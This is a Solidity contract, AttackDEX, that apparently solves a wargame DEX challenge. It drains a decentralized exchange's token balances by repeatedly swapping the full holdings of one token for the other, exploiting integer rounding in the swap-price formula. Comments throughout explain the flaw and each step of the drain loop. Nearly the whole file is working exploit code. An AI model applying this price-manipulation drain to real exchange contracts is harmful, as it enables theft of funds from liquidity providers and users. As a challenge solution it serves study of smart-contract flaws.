// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex {
  //function approve(address spender, uint amount) external;
  function swap(address from, address to, uint amount) external;
  function balanceOf(address token, address account) external view returns (uint);
  function token1() external view returns (address);
  function token2() external view returns (address);
}

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackDEX {
  IDex dexContract;
  address token1;
  address token2;
  address player;

  constructor(address _dexContract) {
    dexContract = IDex(_dexContract);
    token1 = dexContract.token1();
    token2 = dexContract.token2();
    player = msg.sender;
  }

  modifier onlyPlayer() {
    require(player == msg.sender, "Only the player is allowed to call this function");
    _;
  }

  // The approval process was needed to be done interacting directly with the ERC20 contracts by calling the increaseAllowance() functions on each Token contract!
  
  // function approveDexToSpendTokens(uint _amountToApprove) public onlyPlayer() {
  //   bytes4 approveFunctionSignature = bytes4(keccak256("approve(address,uint)"));
  //   // delegateCall to approve the DEX Contract to spend X Tokens on behalf of the Player
  //   (bool success, ) = address(dexContract).delegatecall(abi.encodePacked(approveFunctionSignature, address(dexContract), _amountToApprove));
  //   require(success, "Error, delegateCall to approve the DEX to spend tokens on behalf of the player failed!");

  //   require( (IERC20(token1).allowance(player,address(dexContract)) == _amountToApprove) && (IERC20(token2).allowance(player,address(dexContract)) == _amountToApprove) , "Error, the DEX Contract was not approved to spend tokens on behalf of the player");
  //   approvedTokens = true;
  // }

  function initiateAttack() public onlyPlayer() {
    uint dexAllowanceOnToken1PlayerBalance = IERC20(token1).allowance(player, address(dexContract));
    uint dexAllowanceOnToken2PlayerBalance = IERC20(token2).allowance(player, address(dexContract));

    uint playerToken1Balance = dexContract.balanceOf(token1,player);
    uint playerToken2Balance = dexContract.balanceOf(token2,player);

    require( (dexAllowanceOnToken1PlayerBalance > playerToken1Balance) && (dexAllowanceOnToken2PlayerBalance > playerToken2Balance), "Attack can't be initiated, DEX Contract has not been approved to spend tokens on behalf of the player");

    // The attack basically consists of swapping the two tokens multiple times using the max balance that the player holds at the time of each swap
    // The vulnerability originates from get_swap_price method which determines the exchange rate between tokens in the Dex
      // The division in it won't always calculate to a perfect integer, but a fraction. And there is no fraction types in Solidity

    // The attack starts by swapping ALL the tokens1 for tokens2
    dexContract.swap(token1,token2,playerToken1Balance);

    uint dexToken1Balance = dexContract.balanceOf(token1,address(dexContract));
    uint dexToken2Balance = dexContract.balanceOf(token2,address(dexContract));

    playerToken1Balance = dexContract.balanceOf(token1,player);
    playerToken2Balance = dexContract.balanceOf(token2,player);

    // On each iteration, the player's balance of one of the two tokens will be depleted to 0
    // When any of the player's token balances is greater than the DEX balance of the same token, the total amount of tokens to swap must be the exact amount of the DEX Balance
      // When the above condition is met, if the player sends its total token balance, the DEX balance of the other token won't be enough to match the require amount of tokens to swap, thus, will generate an error when attempting the transferFrom() operation

    while((dexToken1Balance > 0) || (dexToken2Balance > 0)) {
      // Swaps to continously drain the DEX token balances
      if ( (playerToken1Balance == 0) && (dexToken1Balance > playerToken1Balance) ) {
        dexContract.swap(token2,token1,playerToken2Balance);
      }
      if( (playerToken2Balance == 0) && (dexToken2Balance > playerToken2Balance) ) {
        dexContract.swap(token1,token2,playerToken1Balance);
      }

      // When any of the two below conditions is executed, the token's balance of the dex contract has finally been totally depleted
      // Is the token1 player's balance greater than the dex balance?
      if(playerToken1Balance > dexToken1Balance) {
        // Ask a swap for the max amount of tokens1 the DEX contract has
        dexContract.swap(token1,token2,dexToken1Balance);
      }
      
      // Is the token2 player's balance greater than the dex balance?
      if(playerToken2Balance > dexToken2Balance) {
        // Ask a swap for the max amount of tokens2 the DEX contract has
        dexContract.swap(token2,token1,dexToken2Balance);
      }

      // Refresh the balances after the swap was executed
      dexToken1Balance = dexContract.balanceOf(token1,address(dexContract));
      dexToken2Balance = dexContract.balanceOf(token2,address(dexContract));

      playerToken1Balance = dexContract.balanceOf(token1,player);
      playerToken2Balance = dexContract.balanceOf(token2,player);
    }

    require( (dexToken1Balance == 0) || (dexToken2Balance == 0) , "Error, unexpected error while depleting one of the DEX token's balances");
  }


}